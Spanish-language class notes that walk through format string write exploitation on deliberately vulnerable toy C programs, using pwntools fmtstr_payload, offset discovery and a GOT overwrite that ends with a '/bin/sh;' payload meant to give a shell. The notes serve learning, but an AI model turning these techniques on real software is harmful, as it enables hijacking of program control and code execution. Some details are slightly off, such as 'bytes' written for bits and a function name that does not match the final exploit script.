# Format String Write

#pwn #formatstring #pwntools #gdb #exploitation #buffer-overflow

---

## Introducción

Esta clase abordará la manera de escribir donde queramos a través de un format string. Tenemos este código:

```c
#include <stdio.h>

int GLOBAL = 1337;

int main(){
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("\n%n", &GLOBAL);
    printf("%d\n", GLOBAL);
}
```

Compilamos con este comando:

```bash
gcc -g main.c -o main -fno-stack-protector -z execstack -no-pie -Wl,-z,norelro
```

---

## El Especificador %n

`%n` este formato nos permite guardar todo lo que imprima. Si imprimo 10 caracteres, le puedo indicar con ese dónde guardarlos, en este caso en la variable `GLOBAL`. **Importante:** no cuenta los caracteres después del `%n`. Por ejemplo, tal cual está el código, contará 1 → `"\n"`.

Ahora, si estuviera el código así:

```c
#include <stdio.h>

int GLOBAL = 1337;

int main(){
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("AAAAAAAAAA%n\n", &GLOBAL);
    printf("%d\n", GLOBAL);
}
```

Contaría 10 (las 10 A) y guardaría eso en `GLOBAL`.

---

## Uso de pwntools para Format String

Ahora es bastante difícil acomodar un string para vulnerar a través de aquí, para escribir en determinado espacio determinada cosa. Con pwntools nos podemos apoyar un poco:

```python
from pwn import *

vuln = ELF("./main")

direction = vuln.symbols["GLOBAL"]  # Indicamos el símbolo que queremos modificar, la variable GLOBAL en este caso

print(fmtstr_payload(1, {direction:10}))  # La función fmtstr_payload es para format strings, el segundo argumento es el bueno
```

Modificamos un poco nuestro `main.c` y lo compilamos:

```c
#include <stdio.h>

int GLOBAL = 0;

int main(){
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("%10c%n\n", 'a', &GLOBAL);  // %10c va a hacer que se impriman 10 veces el 'a' y el %n lo guardará en GLOBAL
    printf("%d\n", GLOBAL);
}
```

Naturalmente, si ponemos otra cantidad en `%10c` como 666666666, eso nos imprimirá, aunque justamente no son 'a' lo que imprime, son cosas en blanco que no queda resuelto muy bien lo que son. La desventaja es que si ponemos números muy grandes tipo 6666666666, se tardaría mucho en imprimir eso, y más en los retos que no son en local.

---

## Problema con Direcciones Grandes

Y como las direcciones de memoria suelen ser grandes, por ejemplo, sacamos la dirección de global con pwntools con esto:

```python
vuln = ELF("./main")

direction = vuln.symbols["GLOBAL"]

print(direction)
```

Daría: `4207408` ← Un número bastante grande

Para abordar eso deberíamos dividir en 2 escrituras. Veámoslo así por ejemplo (dirección de memoria/valor):

```
4207408    00111001 -> 1337 en binario (valor de GLOBAL)
```

Entonces comenzamos a escribir/modificar desde las X:

```
4207408    0011XXXX
```

Volvemos a hacer una segunda escritura:

```
4207412    YYYYXXXX
```

Como son dos escrituras separadas, escribimos un número más chiquito pero en otra dirección. Así de esa forma escribimos el valor que queríamos utilizando 2 escrituras:

```
4207408    0011XXXX
4207412    YYYYXXXX
```

Por este tipo de cosas estos ataques se vuelven difíciles de hacer a mano cuando quieres escribir muchos valores en direcciones diferentes. Pero gracias a pwntools esto es fácil de hacer, por ejemplo:

```python
fmtstr_payload(1, {direction:10, direccion2:20, direccion3:666})  # pwntools genera el format string adecuado para escribir en esas direcciones esos valores
```

---

## Adaptando el Código para CTF

Ya que vimos por qué un printf puede escribir, modificaremos el `main.c` para que se adapte a como lo podríamos ver en un CTF:

```c
#include <stdio.h>

int GLOBAL = 1337;

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    char buf[128];

    gets(buf);

    printf(buf);

    puts("");

    printf("%d\n", GLOBAL);

    if (GLOBAL == 0xdeadbeef) {
        printf("Ganaste\n");    
    }
}
```

Compilamos con un estándar antiguo para que nos deje:

```bash
gcc -g main.c -o main -fno-stack-protector -z execstack -no-pie -Wl,-z,norelro -std=gnu99
```

---

## Entendiendo el Offset en fmtstr_payload

Ahora si haremos el `solve.py` con pwntools. Ahora veremos qué es el primer argumento. Si checamos la documentación:

```
Arguments:
    offset(int): the first formatter's offset you control  # No se ve muy claro a qué se refiere
    writes(dict): dict with addr, value {addr: value, addr2: value2}
    numbwritten(int): number of byte already written by the printf function
    write_size(str): must be byte, short or int. Cells if you want to write byte by byte, short by short or int by int (hhn, hn or n)
    overflows(int): how many extra overflows (at size sz) to tolerate to reduce the length of the format string
    strategy(str): either 'fast' or 'small' ('small' is default, 'fast' can be used if there are many writes)

Returns:
    The payload in order to do needed writes
```

Bueno, a lo que se refiere el offset que controlamos es a esto:

```bash
./main
%1$x  # Sacar offset 1
78241337  # Este es el offset 1 pero no lo controlamos
```

La manera en la que Elías identifica el primer offset que podemos controlar es la siguiente:

Poner 8 'A' y `%1$x`

```bash
./main
AAAAAAAA%1$x
AAAAAAAA41414141  # Las A son = 41
1337
```

En mi caso, el primer offset es el que controlo. De lo contrario no se verían los 41 ahí, debería haber calado más offsets en este cacho `AAAAAAAA<%n++>$x`.

```bash
./main
AAAAAAAA%6$llx        
AAAAAAAA4141414141414141
1337
```

Igual sacarlo con `llx` se puede. Me dio igual que a Elías, solo que no sé si esté bien mi offset en 1 ya que tiene menos 41, aunque supongo que porque `llx` pone los 8 bytes.

---

## IMPORTANTE: Especificar la Arquitectura

**IMPORTANTE:** Si no no jala NADA y es:

**Especificarle la arquitectura del programa al que estamos tratando, si de 32 o 64 bytes**

Porque las direcciones de memoria son diferentes, obvio una de 8 bytes y otra de 4:

- 64 bytes: `0000000004207408`
- 32 bytes: `04207408`

¿Cómo podemos comprobar eso? Con `checksec` sencillamente:

```bash
checksec main
[*] '/home/kali/Documents/pwn/eliasCodesPruebas/7/main'
    Arch:       amd64-64-little  # Arquitectura de 64 bytes
...
```

Y de esta manera se lo comunicamos a nuestro script:

```python
context.arch = 'amd64'
```

---

## Script de Exploit Completo

Añadámoslo al código, cambiemos el primer argumento de la función por el offset manipulable y veamos qué nos suelta al ejecutarlo.

Además de poner el valor necesario para que nos suelte el ganaste del código `main.c`: `0xdeadbeef`

```python
from pwn import *

context.arch = 'amd64'

vuln = ELF("./main")

direction = vuln.symbols["GLOBAL"]

print(direction)

print(fmtstr_payload(6, {direction:0xdeadbeef}))
```

Al correrlo:

```bash
python3 solve.py
[*] '/home/kali/Documents/pwn/eliasCodesPruebas/7/main'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
    Debuginfo:  Yes
4207424
b'%239c%12$lln%190c%13$hhn%17c%14$hhn%32c%15$hhnaa@3@\x00\x00\x00\x00\x00B3@\x00\x00\x00\x00\x00A3@\x00\x00\x00\x00\x00C3@\x00\x00\x00\x00\x00'  # Format String agradable de 64 bytes
```

Nótese que si no especificamos la arquitectura nos daría una cadena más corta.

---

## Enviando el Payload

Ahora procederemos a probarlo de una vez enviándolo:

```python
from pwn import *

context.arch = 'amd64'

vuln = ELF("./main")

direction = vuln.symbols["GLOBAL"]

print(direction)

payload = fmtstr_payload(6, {direction:0xdeadbeef})

p = process("./main")  # Abrir un proceso del binario a atacar

p.sendline(payload)  # Enviar el payload

p.interactive()  # Para comprobar que está operativo
```

Lo corremos y...

```bash
python3 solve.py
[*] '/home/kali/Documents/pwn/eliasCodesPruebas/7/main'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
    Debuginfo:  Yes
4207424
[+] Starting local process './main': pid 47114
[*] Switching to interactive mode
[*] Process './main' stopped with exit code 0 (pid 47114)
                                                                                                                                                                                                                                              \xd0                                                                                                                                                                                             \x00                \xe0                               \xf1aa@3@
-559038737
Ganaste  # Invocamos la función correctamente
[*] Got EOF while reading in interactive
$      zsh: suspended (signal)  python3 solve.py
```

---

## Argumento write_size

A la función `fmtstr_payload()` se le puede agregar el argumento `write_size='byte'` por ejemplo, dependiendo si nuestro payload está limitado.

Con `byte` sería más grande, con `short` más pequeño y así, pero la diferencia es en la impresión de caracteres. Por ejemplo, `byte` imprime muchos menos que `short`, una diferencia muy notoria. Pero como `byte` ocupa más tamaño y se suele estar restringido en tamaño, pues tenemos que subirle hasta que quepa el payload.

---

## Problema con Múltiples Variables

Ahora, si así agregáramos un `GLOBAL2 = 2` en main y al condicional de ganaste que sea `0xcaffebabe` por ejemplo, y en la función:

```python
from pwn import *

context.arch = 'amd64'

vuln = ELF("./main")

direction = vuln.symbols["GLOBAL"]
direction2 = vuln.symbols["GLOBAL2"]

print(direction)

payload = fmtstr_payload(6, {direction:0xdeadbeef, direction2:0xcaffebabe}, write_size='byte')

p = process("./main") 

p.sendline(payload) 

p.interactive()
```

No funcionaría por algún tipo de colisión, tal vez porque es negativo o porque se van sumando valores al colisionar o colisiona algo. No está claro, pero probablemente sea cosa de pwntools. A lo mejor es muy grande ya que si ponemos variables entre medio de `GLOBAL` y `GLOBAL2`.

Y ponemos valores en el condicional más simples como `if GLOBAL == 0xd3ad && GLOBAL2 == 0xcaf3b3b3` sí funcionaría con el código de arriba que modificamos (obvio poniendo estos valores más simples en la función `fmtstr`).

---

## Trabajando con Funciones de Librería

Bueno, ahora modifiquemos, hagamos un `vuln.c` para que se vea de esta forma y calar más cosas:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void vvln() {
    system("ls");
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    char buf[256];

    gets(buf);

    printf(buf);
}
```

Si vemos, está repleto de funciones de la librería de C, no funciones que estén declaradas en el código. Entonces lo compilamos al bastardo y con gdb hacemos un `info functions`:

```
gef➤  info functions
All defined functions:

File vuln.c:
9:      int main();
5:      void vvln();

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  system@plt  # Aquí dice las funciones de la librería de C las cuales tienen dirección
0x0000000000401040  printf@plt
0x0000000000401050  gets@plt
0x0000000000401060  setvbuf@plt
0x0000000000401070  _start
0x00000000004010a0  _dl_relocate_static_pie
0x00000000004010b0  deregister_tm_clones
0x00000000004010e0  register_tm_clones
0x0000000000401120  __do_global_dtors_aux
0x0000000000401150  frame_dummy
0x00000000004011c0  _fini
gef➤  
```

---

## PLT y GOT

Esa dirección no cambia, es fija, pero no es la dirección real de las funciones, sino que es la dirección donde se guarda un apuntador a la dirección real.

Ponemos un breakpoint donde llame a una, en `gets` por ejemplo:

```
●→   0x40119f <main+0033>      call   0x401050 <gets@plt>
```

Damos `s` y nos dejaría ver la dirección real. En mi caso no sé por qué no me sale nada al darle a `s`, sino que debo darle `"si"` para que me deje entrar a función PLT (Procedure Linkage Table). GDB se salta automáticamente las resoluciones de PLT por defecto.

Entonces dando `si` y luego bastantes `ni` (salto de línea ensamblador):

```
0x7ffff7e2f9c0 <_IO_getline+0000> xor    r9d, r9d
   0x7ffff7e2f9c3 <_IO_getline+0003> jmp    0x7ffff7e2f820 <_IO_getline_info>
   0x7ffff7e2f9c8                  nop    DWORD PTR [rax+rax*1+0x0]
 → 0x7ffff7e2f9d0 <gets+0000>      push   r13  # Nos sale la verdadera dirección de gets
   0x7ffff7e2f9d2 <gets+0002>      push   r12
   0x7ffff7e2f9d4 <gets+0004>      push   rbp
   0x7ffff7e2f9d5 <gets+0005>      push   rbx
   0x7ffff7e2f9d6 <gets+0006>      mov    rbx, rdi
   0x7ffff7e2f9d9 <gets+0009>      sub    rsp, 0x18
```

Pero esa dirección no es fija, es dinámica y cambia, es la direccion en GOT dinamica de gets.

---

## Modificando GOT para Redirección

Hacemos `solve2.py` con este código:

```python
from pwn import *

context.arch = 'amd64'

vuln = ELF("./vuln")

payload = fmtstr_payload(6, {vuln.symbols["puts"]:vuln.symbols["vuln"]})  # Podemos hacer que apunte a esa función

p = process("./vuln")

p.sendline(payload)

p.interactive()
```

Hubo un error en el código así y es que el PLT de `puts` solo guarda una instrucción `jmp` "jump", es decir que brinca al GOT "Global Offset Table" y ahí es donde se guarda la dirección real, entonces no debemos cambiar el `vuln.plt` sino que `vuln.got`.

```
gef> dereference 0x0000000000401030
0x0000000000401030|+0x0000: <puts@plt+0x0> jmp QWORD PTR [rip+0x22da]        # 0x403310 <puts@got.plt>
```

```python
from pwn import *

context.arch = 'amd64'

vuln = ELF("./vuln")

payload = fmtstr_payload(6, {vuln.got["puts"]:vuln.symbols["vvln"]})  # Debemos hacer que a la dirección GOT de puts la cambie por la de vvln (Si lo escribí mal no me jalaba y me di cuenta xd)

p = process("./vuln")

p.sendline(payload)

p.interactive()
```

Entonces hace esto:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void vvln() {  // En puts hacemos que la instrucción de salto en lugar de a GOT (puts real) salte a la dirección de vvln
    system("ls");
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    char buf[256];

    gets(buf);

    printf(buf);

    puts("");
}
```

Si ejecutamos `solve2.py`:

```bash
python3 solve2.py
[*] '/home/kali/Documents/pwn/eliasCodesPruebas/7/vuln'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
    Debuginfo:  Yes
[+] Starting local process './vuln': pid 89364
[*] Switching to interactive mode
                                                                                                     \xa1                                                                                                                                                                          \x00                                              \xe0aaaab03@$                                       main  main.c  solve2.py  solve.py  vuln  vuln.c
[*] Got EOF while reading in interactive
$  
```

Ejecuta el `ls`.

---

## Ejemplo con system() y Argumentos

Otro ejemplo es modificando el vuln de esta manera:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void vuln(char *buf) {
    system(buf);  // Hará lo que digamos si brincamos bien con un valor ejecutable para system
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    char buf[256];

    gets(buf);

    printf(buf);

    puts(buf);
}
```

Modificamos nuestro solve 2 para abordar eso poniendo en el inicio de nuestro payload algo interesante. Primero un inciso de cómo debuggear sencillo:

### Cómo Debuggear

La manera de debuggear podía seguir un estilo así:

```
info functions puts
0x0000000000401030  puts@plt
dereference 0x0000000000401030
```

Y ahí saldría la info de GOT y lo demás. Solo que se ocupa una sesión de debugging activa. Como el Elías, agarramos su dirección y otro dereference.

Ahora el código queda más o menos así del `solve2.py`:

```python
from pwn import *

context.arch = 'amd64'

vuln = ELF("./vuln")

payload = b"/bin/sh;"
payload += fmtstr_payload(7, {vuln.got["puts"]:vuln.symbols["vvln"]}, numbwritten=8)  # Se pasa al offset 7 por lo de /bin/sh;

p = process("./vuln")

p.sendline(payload)

p.interactive()
```

Mirarlo:

```bash
./vuln 
/bin/sh;AAAAAAAA%7$llx
/bin/sh;AAAAAAAA4141414141414141
```

El offset 7 es el bueno.

Aparte, el `numbwritten` es por los 8 caracteres de `/bin/sh;`, es para decirle lo que ya se puso pues.

Entonces se supone al ejecutar esto nos daría una shell.

---

## Tags

#pwn #formatstring #pwntools #gdb #exploitation #buffer-overflow #PLT #GOT #architecture #offset #debugging